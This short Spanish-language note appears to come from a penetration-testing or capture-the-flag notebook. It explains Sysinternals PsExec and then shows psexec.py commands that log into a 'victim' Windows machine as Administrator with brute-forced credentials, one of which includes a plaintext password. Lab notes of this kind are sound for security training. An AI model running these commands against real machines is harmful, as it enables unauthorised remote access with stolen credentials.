PSexec es una herramienta de línea de comandos desarrollada por Sysinternals (ahora parte de Microsoft) que permite ejecutar comandos de forma remota en computadoras Windows. Es útil para administradores de sistemas que necesitan ejecutar tareas en máquinas remotas sin tener que estar físicamente presentes en ellas. Con PSexec, puedes ejecutar programas, scripts o comandos en una computadora remota desde tu propia máquina.

Con el usuarios y la contraseña obtenida previamente con el ataque de fuerza bruta accederemos via psexec con el siguiente comando
```Bash
psexec.py Administrator@10.2.30.5
```
![[Pasted image 20240308083233.png]]

# Acceder a la maquina victima con psexec
```Bash
python3 psexec.py administrator:'MEGACORP_4dm1n!!'@10.129.29.151
```
![[Pasted image 20240522114857.png]]